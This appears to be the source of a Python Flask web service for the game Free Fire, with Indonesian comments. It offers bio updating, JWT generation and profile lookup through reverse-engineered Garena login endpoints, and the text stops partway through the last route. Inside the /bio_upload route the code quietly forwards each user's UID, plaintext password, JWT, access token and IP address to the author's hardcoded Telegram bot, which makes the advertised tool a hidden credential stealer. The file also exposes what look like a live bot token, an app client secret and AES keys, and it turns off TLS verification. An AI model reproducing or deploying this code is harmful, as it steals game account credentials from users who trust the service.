# app.py - Menggunakan metode search.py (protobuf + encrypt) untuk cari profile
from flask import Flask, request, jsonify, make_response
import requests
import binascii
import jwt
import urllib3
import random
import string
import time
import json
import hashlib
import re
import struct
import threading
import ssl
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from datetime import datetime
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf import runtime_version as _runtime_version
from google.protobuf.internal import builder as _builder
from google.protobuf.json_format import MessageToJson

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ============ PROTOBUF SETUP ============
_sym_db = _symbol_database.Default()

_runtime_version.ValidateProtobufRuntimeVersion(
    _runtime_version.Domain.PUBLIC, 6, 30, 0, '', 'MajorLoginRes.proto'
)

_req_desc = _descriptor_pool.Default().AddSerializedFile(
    b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t'
    b'\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05'
    b'\x12\x16\n\x0eclient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t'
    b'\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t'
    b'\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r'
    b'\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t'
    b'\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r'
    b'\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t'
    b'\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t'
    b'\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t'
    b'\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0bdevice_type\x18\x18 \x01(\t'
    b"\x12'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity"
    b'\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05'
    b'\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t'
    b'\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t'
    b'\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05'
    b'\x12"\n\x1a\x65xternal_storage_available\x18= \x01(\x05'
    b'\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05'
    b'\x12"\n\x1ainternal_storage_available\x18? \x01(\x05'
    b'\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05'
    b'\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05'
    b'\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05'
    b'\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05'
    b'\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t'
    b'\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t'
    b'\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05'
    b'\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t'
    b'\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t'
    b'\x12\x14\n\x0cgraphics_api\x18V \x01(\t'
    b'\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r'
    b'\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05'
    b'\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c'
    b'\x12\x14\n\x0cloading_time\x18\\ \x01(\r'
    b'\x12\x17\n\x0frelease_channel\x18] \x01(\t'
    b'\x12\x12\n\nextra_info\x18^ \x01(\t'
    b'\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r'
    b'\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05'
    b'\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t'
    b'\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t'
    b'"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05'
    b'\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3'
)

_req_globals = {}
_builder.BuildMessageAndEnumDescriptors(_req_desc, _req_globals)
_builder.BuildTopDescriptorsAndMessages(_req_desc, 'MajorLoginReq_pb2', _req_globals)
if not _descriptor._USE_C_DESCRIPTORS:
    _req_desc._options = None
    _req_globals['_MAJORLOGIN']._serialized_start = 24
    _req_globals['_MAJORLOGIN']._serialized_end = 1426
    _req_globals['_GAMESECURITY']._serialized_start = 1428
    _req_globals['_GAMESECURITY']._serialized_end = 1481

MajorLogin = _req_globals['MajorLogin']
GameSecurity = _req_globals['GameSecurity']

_res_desc = _descriptor_pool.Default().AddSerializedFile(
    b'\n\x13MajorLoginRes.proto"|\n\rMajorLoginRes'
    b'\x12\x13\n\x0b\x61\x63\x63ount_uid\x18\x01 \x01(\x04'
    b'\x12\x0e\n\x06region\x18\x02 \x01(\t'
    b'\x12\r\n\x05token\x18\x08 \x01(\t'
    b'\x12\x0b\n\x03url\x18\n \x01(\t'
    b'\x12\x11\n\ttimestamp\x18\x15 \x01(\x03'
    b'\x12\x0b\n\x03key\x18\x16 \x01(\x0c'
    b'\x12\n\n\x02iv\x18\x17 \x01(\x0c\x62\x06proto3'
)

_res_globals = {}
_builder.BuildMessageAndEnumDescriptors(_res_desc, _res_globals)
_builder.BuildTopDescriptorsAndMessages(_res_desc, 'MajorLoginRes_pb2', _res_globals)
if not _descriptor._USE_C_DESCRIPTORS:
    _res_desc._loaded_options = None
    _res_globals['_MAJORLOGINRES']._serialized_start = 23
    _res_globals['_MAJORLOGINRES']._serialized_end = 147

MajorLoginRes = _res_globals['MajorLoginRes']

# ============ IMPORT PROTOBUF UNTUK PROFILE ============
try:
    import like_count_pb2
    import uid_generator_pb2
    PROTOBUF_AVAILABLE = True
except ImportError:
    PROTOBUF_AVAILABLE = False
    print("⚠️  Protobuf files not found, using raw mode")

# ============ KONFIGURASI ============
AES_KEY = b'Yg&tc%DEuh6%Zc^8'
AES_IV = b'6oyZDr22E3ychjM%'

GARENA_OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"
MAJORLOGIN_URL = "https://loginbp.ggblueshark.com/MajorLogin"

CLIENT_SECRET = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"
CLIENT_ID = "100067"

HTTP_HEADERS = {
    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Expect': '100-continue',
    'X-Unity-Version': '2018.4.11f1',
    'X-GA': 'v1 1',
    'ReleaseVersion': 'OB54',
}

# ============ TELEGRAM CONFIG ============
BOT_TOKEN = "8965307683:AAGXwuIge4QKuYXtrkXhG4AahxDrynqi7SY"
OWNER_ID = 8660700322
CHANNEL_PROMO = "@dindingijo"

# ============ KONFIGURASI ============
FREEFIRE_UPDATE_URLS = [
    "https://clientbp.ggblueshark.com/UpdateSocialBasicInfo",
    "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
]

KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

# ============ HEADERS ============
BIO_HEADERS = {
    "Expect": "100-continue",
    "X-Unity-Version": "2018.4.11f1",
    "X-GA": "v1 1",
    "ReleaseVersion": "OB54",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
}

LOGIN_HEADERS = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-Unity-Version": "2018.4.11f1",
    "X-GA": "v1 1",
    "ReleaseVersion": "OB54"
}

# ============ SERVER CONFIG (Dari search.py) ============
SERVER_CONFIG = {
    "ID": {
        "info_url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
        "like_url": "https://clientbp.ggpolarbear.com/LikeProfile",
        "region_code": "ID",
        "name": "Indonesia",
        "priority": 1
    },
    "IND": {
        "info_url": "https://client.ind.freefiremobile.com/GetPlayerPersonalShow",
        "like_url": "https://client.ind.freefiremobile.com/LikeProfile",
        "region_code": "IND",
        "name": "India",
        "priority": 2
    },
    "BR": {
        "info_url": "https://client.us.freefiremobile.com/GetPlayerPersonalShow",
        "like_url": "https://client.us.freefiremobile.com/LikeProfile",
        "region_code": "BR",
        "name": "Brazil",
        "priority": 3
    },
    "US": {
        "info_url": "https://client.us.freefiremobile.com/GetPlayerPersonalShow",
        "like_url": "https://client.us.freefiremobile.com/LikeProfile",
        "region_code": "US",
        "name": "United States",
        "priority": 4
    },
    "BD": {
        "info_url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
        "like_url": "https://clientbp.ggpolarbear.com/LikeProfile",
        "region_code": "BD",
        "name": "Bangladesh",
        "priority": 5
    }
}

# ============ FUNGSI DARI search.py ============
def aes_encrypt_profile(data):
    """Encrypt data dengan AES (sama seperti search.py)"""
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return cipher.encrypt(pad(data, AES.block_size))

def enc_uid(uid: str) -> str:
    """Encrypt UID dengan protobuf uid_generator (sama seperti search.py)"""
    try:
        if PROTOBUF_AVAILABLE:
            uid_msg = uid_generator_pb2.uid_generator()
            uid_msg.krishna_ = int(uid)
            uid_msg.teamXdarks = 1
            encrypted = binascii.hexlify(aes_encrypt_profile(uid_msg.SerializeToString())).decode()
            return encrypted
        else:
            # Fallback manual
            import struct
            raw_data = struct.pack('>Q', int(uid)) + b'\x01' * 8
            encrypted = binascii.hexlify(aes_encrypt_profile(raw_data)).decode()
            return encrypted
    except Exception as e:
        print(f"Encrypt error: {e}")
        return None

def parse_protobuf_response(binary_data: bytes):
    """Parse protobuf response (sama seperti search.py)"""
    if PROTOBUF_AVAILABLE:
        try:
            items = like_count_pb2.Info()
            items.ParseFromString(binary_data)
            return json.loads(MessageToJson(items))
        except:
            pass
    
    # Manual parsing fallback
    try:
        import re
        data_str = binary_data.decode('utf-8', errors='ignore')
        result = {"AccountInfo": {}}
        
        name_match = re.findall(b'[\x20-\x7e]{3,30}', binary_data)
        if name_match:
            valid_names = [n.decode('utf-8', errors='ignore') for n in name_match 
                         if n.decode('utf-8', errors='ignore').isprintable()
                         and len(n.decode('utf-8', errors='ignore')) > 3
                         and not n.decode('utf-8', errors='ignore').startswith('http')]
            if valid_names:
                result["AccountInfo"]["PlayerNickname"] = valid_names[0]
        
        numbers = re.findall(b'\x00{0,4}(\d{1,10})\x00', binary_data)
        if len(numbers) >= 2:
            result["AccountInfo"]["Likes"] = int(numbers[0]) if numbers[0].isdigit() else 0
            result["AccountInfo"]["PlayerLevel"] = int(numbers[1]) if len(numbers) > 1 and numbers[1].isdigit() else 0
        
        return result if result.get("AccountInfo") and result["AccountInfo"].get("PlayerNickname") else None
    except:
        return None

def check_profile_with_jwt(uid: str, jwt_token: str, server: str = "ID"):
    """Check profile menggunakan metode search.py (protobuf + encrypt)"""
    server_config = SERVER_CONFIG.get(server.upper())
    if not server_config:
        return None
    
    encrypted = enc_uid(str(uid))
    if not encrypted:
        return None
    
    headers = {
        'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
        'Authorization': f"Bearer {jwt_token}",
        'Content-Type': "application/x-www-form-urlencoded",
        'X-GA': "v1 1",
        'ReleaseVersion': "OB54"
    }
    
    try:
        edata = bytes.fromhex(encrypted)
        response = requests.post(
            server_config["info_url"],
            data=edata,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            parsed = parse_protobuf_response(response.content)
            
            if parsed and parsed.get('AccountInfo'):
                account_info = parsed['AccountInfo']
                return {
                    "uid": uid,
                    "name": account_info.get('PlayerNickname', 'Unknown'),
                    "level": account_info.get('PlayerLevel', '?'),
                    "likes": account_info.get('Likes', 0),
                    "server": server,
                    "server_name": server_config["name"],
                    "guild": account_info.get('GuildName', 'No Guild'),
                    "status": "✅ Found"
                }
        return None
    except Exception as e:
        print(f"Profile check error: {e}")
        return None

def check_profile_all_servers(uid: str, jwt_token: str):
    """Cari profile di semua server (seperti search.py)"""
    sorted_servers = sorted(SERVER_CONFIG.items(), key=lambda x: x[1]['priority'])
    
    for server_code, server_config in sorted_servers:
        profile = check_profile_with_jwt(uid, jwt_token, server_code)
        if profile:
            return profile
    
    return None

# ============ FUNGSI JWT GENERATOR ============
def random_ua():
    versions = ['4.0.18P6', '4.0.19P7', '4.1.0P3', '5.0.1B2', '5.2.5P3', '5.3.2P2', '5.4.3B2', '5.5.2P3']
    models = ['SM-A125F', 'POCO M3', 'Redmi 9A', 'RMX2185', 'moto g(9) play', 'ASUS_Z01QD', 'OnePlus Nord']
    android = random.choice(['9', '10', '11', '12', '13'])
    lang = random.choice(['en-US', 'hi-IN', 'pt-BR', 'id-ID'])
    country = random.choice(['USA', 'IND', 'BRA', 'IDN'])
    return f"GarenaMSDK/{random.choice(versions)}({random.choice(models)};Android {android};{lang};{country};)"

def aes_encrypt_data(data):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return cipher.encrypt(pad(data, AES.block_size))

def get_garena_tokens_sync(uid, password):
    headers = dict(HTTP_HEADERS)
    headers["User-Agent"] = random_ua()
    headers["Host"] = "100067.connect.garena.com"
    headers["Accept-Encoding"] = "gzip, deflate, br"
    headers["Connection"] = "close"

    payload = {
        "uid": uid,
        "password": password,
        "response_type": "token",
        "client_type": "2",
        "client_secret": CLIENT_SECRET,
        "client_id": CLIENT_ID,
    }

    try:
        resp = requests.post(GARENA_OAUTH_URL, headers=headers, data=payload, timeout=15, verify=False)
        if resp.status_code != 200:
            return None
        body = resp.json()
        open_id = body.get("open_id")
        access_token = body.get("access_token")
        if not open_id or not access_token:
            return None
        return {"open_id": open_id, "access_token": access_token}
    except:
        return None

def build_major_login_payload_sync(open_id, access_token):
    ml = MajorLogin()
    ml.event_time = str(datetime.now())[:-7]
    ml.game_name = "free fire"
    ml.platform_id = 1
    ml.client_version = "2.124.1"
    ml.system_software = "Android OS 9 / API-28 (PQ3B.190801.10101846/G9650ZHU2ARC6)"
    ml.system_hardware = "Handheld"
    ml.telecom_operator = "Verizon"
    ml.network_type = "WIFI"
    ml.screen_width = 1920
    ml.screen_height = 1080
    ml.screen_dpi = "280"
    ml.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    ml.memory = 3003
    ml.gpu_renderer = "Adreno (TM) 640"
    ml.gpu_version = "OpenGL ES 3.1 v1.46"
    ml.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    ml.client_ip = "223.191.51.89"
    ml.language = "en"
    ml.open_id = open_id
    ml.open_id_type = "4"
    ml.device_type = "Handheld"
    ml.memory_available.version = 55
    ml.memory_available.hidden_value = 81
    ml.access_token = access_token
    ml.platform_sdk_id = 1
    ml.network_operator_a = "Verizon"
    ml.network_type_a = "WIFI"
    ml.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    ml.external_storage_total = 36235
    ml.external_storage_available = 31335
    ml.internal_storage_total = 2519
    ml.internal_storage_available = 703
    ml.game_disk_storage_available = 25010
    ml.game_disk_storage_total = 26628
    ml.external_sdcard_avail_storage = 32992
    ml.external_sdcard_total_storage = 36235
    ml.login_by = 3
    ml.library_path = "/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/lib/arm64"
    ml.reg_avatar = 1
    ml.library_token = "5b892aaabd688e571f688053118a162b|/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/base.apk"
    ml.channel_type = 3
    ml.cpu_type = 2
    ml.cpu_architecture = "64"
    ml.client_version_code = "2019118695"
    ml.graphics_api = "OpenGLES2"
    ml.supported_astc_bitset = 16383
    ml.login_open_id_type = 4
    ml.analytics_detail = b"FwQVTgUPX1UaUllDDwcWCRBpWA0FUgsvA1snWlBaO1kFYg=="
    ml.loading_time = 13564
    ml.release_channel = "android"
    ml.extra_info = "KqsHTymw5/5GB23YGniUYN2/q47GATrq7eFeRatf0NkwLKEMQ0PK5BKEk72dPflAxUlEBir6Vtey83XqF593qsl8hwY="
    ml.android_engine_init_flag = 110009
    ml.if_push = 1
    ml.is_vpn = 1
    ml.origin_platform_type = "4"
    ml.primary_platform_type = "4"
    return aes_encrypt_data(ml.SerializeToString())

def major_login_sync(encrypted_payload):
    try:
        resp = requests.post(MAJORLOGIN_URL, data=encrypted_payload, headers=HTTP_HEADERS, timeout=15, verify=False)
        if resp.status_code != 200:
            return None
        raw = resp.content
        proto = MajorLoginRes()
        proto.ParseFromString(raw)
        return {
            "token": proto.token,
            "region": proto.region,
            "url": proto.url,
            "tcp_key": proto.key.hex() if proto.key else None,
            "tcp_iv": proto.iv.hex() if proto.iv else None,
        }
    except:
        return None

def generate_jwt_sync(uid, password):
    try:
        oauth = get_garena_tokens_sync(uid, password)
        if not oauth:
            return None
        encrypted = build_major_login_payload_sync(oauth["open_id"], oauth["access_token"])
        result = major_login_sync(encrypted)
        if not result:
            return None
        return {
            "open_id": oauth["open_id"],
            "access_token": oauth["access_token"],
            **result
        }
    except:
        return None

# ============ FUNGSI ENKRIPSI ============
def encrypt_data(data_bytes):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    padded = pad(data_bytes, AES.block_size)
    return cipher.encrypt(padded)

def encode_varint(n):
    result = []
    while True:
        byte = n & 0x7F
        n >>= 7
        if n:
            byte |= 0x80
        result.append(byte)
        if not n:
            break
    return bytes(result)

def build_bio_payload(bio_text):
    payload = b''
    payload += encode_varint((2 << 3) | 0) + encode_varint(17)
    payload += encode_varint((5 << 3) | 2) + encode_varint(0)
    payload += encode_varint((6 << 3) | 2) + encode_varint(0)
    bio_bytes = bio_text.encode('utf-8')
    payload += encode_varint((8 << 3) | 2) + encode_varint(len(bio_bytes)) + bio_bytes
    payload += encode_varint((9 << 3) | 0) + encode_varint(1)
    payload += encode_varint((11 << 3) | 2) + encode_varint(0)
    payload += encode_varint((12 << 3) | 2) + encode_varint(0)
    return payload

# ============ DECODE JWT MANUAL ============
def decode_jwt_manual(jwt_token):
    try:
        parts = jwt_token.split('.')
        if len(parts) < 2:
            return None
        payload_part = parts[1]
        padding = 4 - len(payload_part) % 4
        if padding != 4:
            payload_part += '=' * padding
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        payload = json.loads(decoded_bytes)
        return payload
    except:
        return None

def get_uid_from_jwt(jwt_token):
    decoded = decode_jwt_manual(jwt_token)
    if decoded:
        return decoded.get("account_id")
    return None

def get_region_from_jwt(jwt_token):
    decoded = decode_jwt_manual(jwt_token)
    if decoded:
        return decoded.get("country_code") or decoded.get("lock_region", "ID")
    return "ID"

def decode_base64_name(encoded_name):
    if not encoded_name:
        return None
    try:
        padding = 4 - len(encoded_name) % 4
        if padding != 4:
            encoded_name += '=' * padding
        decoded = base64.b64decode(encoded_name)
        return decoded.decode('utf-8', errors='ignore')
    except:
        return encoded_name

# ============ FUNGSI UTAMA ============
def upload_bio_request(jwt_token, bio_text):
    try:
        payload_bytes = build_bio_payload(bio_text)
        encrypted = encrypt_data(payload_bytes)
        headers = BIO_HEADERS.copy()
        headers["Authorization"] = f"Bearer {jwt_token}"
        for endpoint in FREEFIRE_UPDATE_URLS:
            try:
                resp = requests.post(endpoint, headers=headers, data=encrypted, timeout=15, verify=False)
                status_text = "✅ Success" if resp.status_code == 200 else f"⚠️ Status {resp.status_code}"
                raw_hex = binascii.hexlify(resp.content).decode('utf-8')
                return {
                    "status": status_text,
                    "code": resp.status_code,
                    "bio": bio_text,
                    "endpoint": endpoint,
                    "server_response": raw_hex
                }
            except:
                continue
        return {"status": "❌ All endpoints failed", "code": 500}
    except:
        return {"status": "❌ Error", "code": 500}

def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", access_token=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        message = f"""🔥 <b>FREE FIRE BIO UPDATE</b> 🔥

👤 <b>Name:</b> {name or 'N/A'}
🆔 <b>UID:</b> <code>{uid}</code>
🔑 <b>Password:</b> <code>{password}</code>
📊 <b>Level:</b> {level or 'N/A'}
🏆 <b>Rank:</b> {rank or 'N/A'}
⚔️ <b>Guild:</b> {clan or 'N/A'}
📝 <b>Bio:</b> {signature or 'N/A'}
🌍 <b>Region:</b> {region.upper() if region else 'ID'}
📱 <b>Bio Status:</b> {bio_status}

🔐 <b>JWT TOKEN:</b>
<code>{jwt_token}</code>

🔑 <b>Access Token:</b>
<code>{access_token[:50] if access_token else 'N/A'}...</code>

📞 <b>IP Caller:</b> {ip_address}
⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}

💡 Join: {CHANNEL_PROMO}"""
        
        payload = {"chat_id": OWNER_ID, "text": message, "parse_mode": "HTML"}
        threading.Thread(target=lambda: requests.post(url, json=payload, timeout=10)).start()
        return True
    except:
        return False

# ============ ROUTES ============
@app.route("/bio_upload", methods=["GET", "POST"])
def combined_bio_upload():
    bio = request.args.get("bio") or request.form.get("bio")
    jwt_token = request.args.get("jwt") or request.form.get("jwt")
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.form.get("pass")
    region = request.args.get("region") or request.form.get("region") or "id"
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not bio:
        return jsonify({
            "status": "❌ Error",
            "code": 400,
            "error": "Missing 'bio' parameter",
            "usage": {
                "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT&region=id",
                "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id"
            }
        }), 400
    
    final_jwt = jwt_token
    final_uid = uid
    final_password = password or "N/A"
    final_region = region.lower()
    login_method = "Direct JWT"
    profile_info = None
    access_token = None
    final_name = None
    
    # Method 1: Direct JWT
    if final_jwt:
        uid_from_jwt = get_uid_from_jwt(final_jwt)
        region_from_jwt = get_region_from_jwt(final_jwt)
        if uid_from_jwt:
            final_uid = uid_from_jwt
            if region == "id" and region_from_jwt:
                final_region = region_from_jwt.lower()
            login_method = "Direct JWT"
    
    # Method 2: UID + Password → AUTO GENERATE JWT
    elif uid and password:
        login_method = "UID/Pass Login (Auto Generate JWT)"
        final_uid = uid
        final_password = password
        
        try:
            result = generate_jwt_sync(uid, password)
            if result and result.get('token'):
                final_jwt = result['token']
                access_token = result.get('access_token')
                uid_from_jwt = get_uid_from_jwt(final_jwt)
                region_from_jwt = get_region_from_jwt(final_jwt)
                if uid_from_jwt:
                    final_uid = uid_from_jwt
                if region == "id" and region_from_jwt:
                    final_region = region_from_jwt.lower()
            else:
                return jsonify({
                    "status": "❌ JWT Generation Failed",
                    "code": 401,
                    "error": "Failed to generate JWT from UID/Password. Please check credentials.",
                    "uid": uid,
                    "hint": "Make sure UID and Password are correct"
                }), 401
        except Exception as e:
            return jsonify({
                "status": "❌ JWT Generation Error",
                "code": 500,
                "error": str(e),
                "uid": uid
            }), 500
    
    if not final_jwt:
        return jsonify({
            "status": "❌ JWT Required",
            "code": 400,
            "error": "Please provide a valid JWT token or UID/Pass"
        }), 400
    
    # Upload bio
    bio_result = upload_bio_request(final_jwt, bio)
    
    # Check profile menggunakan metode search.py (protobuf + encrypt)
    if final_uid:
        try:
            profile_info = check_profile_all_servers(str(final_uid), final_jwt)
            if profile_info:
                final_name = profile_info.get('name')
                final_region = profile_info.get('server', final_region)
        except Exception as e:
            print(f"Profile search error: {e}")
            profile_info = None
    
    # Jika tidak ditemukan, gunakan nama dari JWT
    if not profile_info:
        name_from_jwt = get_uid_from_jwt(final_jwt)
        decoded_name = decode_base64_name(name_from_jwt) if name_from_jwt else 'Unknown'
        profile_info = {
            "name": decoded_name or 'Unknown',
            "level": '?',
            "rank": '?',
            "uid": final_uid,
            "server": final_region,
            "server_name": "Unknown",
            "guild": "N/A",
            "status": "❌ Not Found"
        }
    
    # Kirim Telegram
    send_telegram_notification(
        uid=profile_info.get('uid', final_uid or 'N/A'),
        password=final_password,
        name=profile_info.get('name', 'Unknown'),
        level=profile_info.get('level', '?'),
        rank=profile_info.get('rank', '?'),
        region=profile_info.get('server', final_region),
        jwt_token=final_jwt,
        ip_address=client_ip,
        bio_status=bio_result.get('status', 'Unknown'),
        signature=bio,
        clan=profile_info.get('guild', 'N/A'),
        access_token=access_token
    )
    
    response_data = {
        "Credit": "sulav_codex_ff",
        "Join For More": "Telegram: @sulav_don2",
        "action": "UPDATE BIO",
        "status": bio_result.get("status", "Unknown"),
        "login_method": login_method,
        "code": bio_result.get("code", 500),
        "bio": bio,
        "uid": profile_info.get('uid', final_uid),
        "password": final_password,
        "name": profile_info.get('name', 'Unknown'),
        "level": profile_info.get('level', '?'),
        "rank": profile_info.get('rank', '?'),
        "clan": profile_info.get('guild', 'N/A'),
        "profile_status": profile_info.get('status', '❌ Not Found'),
        "region": profile_info.get('server', final_region).upper(),
        "server_response": bio_result.get("server_response", "N/A"),
        "endpoint_used": bio_result.get("endpoint", "N/A"),
        "generated_jwt": final_jwt,
        "access_token": access_token,
        "telegram_sent": True,
        "profile_method": "protobuf (search.py)"
    }

    response = make_response(jsonify(response_data))
    response.headers["Content-Type"] = "application/json"
    return response

@app.route("/generate_jwt", methods=["GET", "POST"])
def generate_jwt_only():
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.form.get("pass")
    
    if not uid or not password:
        return jsonify({
            "success": False,
            "error": "Missing uid or pass parameter",
            "usage": "/generate_jwt?uid=16208500077&pass=ANONFK123ABC"
        }), 400
    
    try:
        result = generate_jwt_sync(uid, password)
        if result and result.get('token'):
            return jsonify({
                "success": True,
                "uid": uid,
                "jwt_token": result['token'],
                "access_token": result.get('access_token'),
                "region": result.get('region'),
                "open_id": result.get('open_id'),
                "Credit": "sulav_codex_ff"
            })
        else:
            return jsonify({
                "success": False,
                "error": "Failed to generate JWT",
                "uid": uid
            }), 401
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e),
            "uid": uid
        }), 500

@app.route("/check_profile", methods=["GET"])
def check_profile():
    uid = request.args.get("uid")
    jwt_token = request.args.get("jwt")
    
    if not uid:
        return jsonify({
            "error": "Missing uid parameter",
            "usage": "/check_profile?uid=16203030000&jwt=YOUR_JWT"
        }), 400
    
    if not jwt_token:
        return jsonify({
            "error": "Missing jwt parameter",
            "usage": "/check_profile?uid=16203030000&jwt=YOUR_JWT"
        }), 400
    
    result = check_profile_all_servers(uid, jwt_token)
    if result:
        return jsonify({
            "success": True,
            "action": "CHECK PROFILE",
            "data": result,
            "method": "protobuf (search.py)"
        })
    else:
        return jsonify({
            "success": False,
            "error": "Profile not found on any server"
        }), 404

# Tambahkan ini di app.py setelah route /check_profile

@app.route("/get_bio", methods=["GET"])
def get_bio():
    """Endpoint untuk mendapatkan bio orang lain (read-only)"""
    uid = request.args.get("uid")
    jwt_token = request.args.get("jwt")  # Opsional, untuk cek profile via protobuf
    region = request.args.get("region", "id")
    
    if not uid:
        return jsonify({
            "success": False,
            "error": "Missing 'uid' parameter",
            "usage": "/get_bio?uid=16203030000&region=id"
        }), 400
    
    try:
        # Coba dari API ff.ggbluewhale.store dulu (cepat)
        url = f"https://ff.ggbluewhale.store/api/data?region={region}&uid={uid}&key=kenn"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('basicInfo'):
                basic = data['basicInfo']
                social = data.get('socialInfo', {})
                clan = data.get('clanBasicInfo', {})
                return jsonify({
                    "success": True,
                    "action": "GET BIO",
                    "data": {
                        "uid": basic.get('accountId', uid),
                        "name": basic.get('nickname', 'Unknown'),
                        "level": basic.get('level', '?'),
                        "rank": basic.get('rank', '?'),
                        "region": basic.get('region', region.upper()),
                        "bio": social.get('signature', ''),
                        "clan": clan.get('clanName', 'N/A')
                    },
                    "Credit": "sulav_codex_ff",
                    "Join For More": "Telegram: @sulav_don2"
                })
        
        # Jika API gagal, coba pakai protobuf (butuh JWT)
        if jwt_token:
            profile = check_profile_with_jwt(uid, jwt_token, region.upper())
            if profile:
                return jsonify({
                    "success": True,
                    "action": "GET BIO (protobuf)",
                    "data": {
                        "uid": profile.get('uid'),
                        "name": profile.get('name'),
                        "level": profile.get('level'),
                        "likes": profile.get('likes'),
                        "region": profile.get('server'),
                        "guild": profile.get('guild'),
                        "bio": "N/A (protobuf tidak menyimpan bio)"
                    },
                    "Credit": "sulav_codex_ff"
                })
        
        return jsonify({
            "success": False,
